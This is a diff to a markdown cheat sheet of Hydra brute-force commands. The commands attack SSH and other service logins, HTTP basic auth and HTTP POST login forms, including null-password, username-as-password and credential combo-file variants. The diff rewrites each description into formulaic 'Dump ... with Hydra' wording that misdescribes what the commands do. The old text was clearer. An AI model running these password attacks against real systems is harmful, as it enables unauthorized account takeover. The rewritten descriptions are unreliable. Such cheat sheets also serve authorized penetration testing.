@@ -11,9 +11,9 @@ import wordlists_users
 
 ### Brute service login
 
-Brute one user with a password list against the chosen service (FTP, SSH, IMAP, MSSQL, RDP, VNC, SMTP, MySQL, etc.).
+Dump brute service login with Hydra.
 
-```sh title:"Single user, password list against chosen service"
+```sh title:"Hydra Dump Brute Service Login"
 hydra -l $user -P $wordlists $scheme_hydra_protocol://$domain
 ```
 <!-- cheat
@@ -24,9 +24,9 @@ import domain_ip
 
 ### User and password lists
 
-Brute a chosen service with user and password lists.
+Dump user and password lists with Hydra.
 
-```sh title:"User list and password list against chosen service"
+```sh title:"Hydra Dump User and Password Lists"
 hydra -L "$wordlists_users" -P "$wordlists" "$rhost_ip" "$scheme_hydra_protocol"
 ```
 <!-- cheat
@@ -36,9 +36,9 @@ var rhost_ip
 
 ### Single password
 
-Try one username and one password against SSH.
+Dump single password with Hydra.
 
-```sh title:"Single SSH username and password"
+```sh title:"Hydra Dump Single Password"
 hydra -l "$user" -p "$pass" "$rhost_ip" ssh
 ```
 <!-- cheat
@@ -49,9 +49,9 @@ var rhost_ip
 
 ### Username as password
 
-Try each username as its own password against SSH.
+Dump username as password with Hydra.
 
-```sh title:"Try username as password against SSH"
+```sh title:"Hydra Dump Username as Password"
 hydra -L "$wordlists_users" -e s "$rhost_ip" ssh
 ```
 <!-- cheat
@@ -61,9 +61,9 @@ var rhost_ip
 
 ### Null password
 
-Try a null password against SSH for one username.
+Dump null password with Hydra.
 
-```sh title:"Try null password against SSH"
+```sh title:"Hydra Dump Null Password"
 hydra -l "$user" -e n "$rhost_ip" ssh
 ```
 <!-- cheat
@@ -73,9 +73,9 @@ var rhost_ip
 
 ### Login-pass file
 
-Use a `user:pass` combo file against SSH on a custom port.
+Run login pass file with Hydra.
 
-```sh title:"Use user:pass combo file against SSH"
+```sh title:"Hydra Run Login Pass File"
 hydra -t 4 -s "$rport" -C "$combo_file" "$rhost_ip" ssh
 ```
 <!-- cheat
@@ -86,9 +86,9 @@ var rhost_ip
 
 ### Brute HTTP basic auth
 
-Brute HTTP Basic auth on the document root. Quick win against router admin pages and old internal apps.
+Run brute HTTP basic auth with Hydra.
 
-```sh title:"Brute HTTP Basic auth at document root"
+```sh title:"Hydra Run Brute HTTP Basic Auth"
 hydra -l $user -P $wordlists $domain http-get
 ```
 <!-- cheat
@@ -99,9 +99,9 @@ import domain_ip
 
 ### Brute HTTP POST form
 
-Brute a form-based login over HTTP POST. Edit the path, parameter names, and the failure-string (`F=incorrect`) to match the target app.
+Run brute HTTP POST form with Hydra.
 
-```sh title:"Brute form login, edit path/params/failure marker"
+```sh title:"Hydra Run Brute HTTP POST Form"
 hydra -l $user -P $wordlists $domain http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
 ```
 <!-- cheat
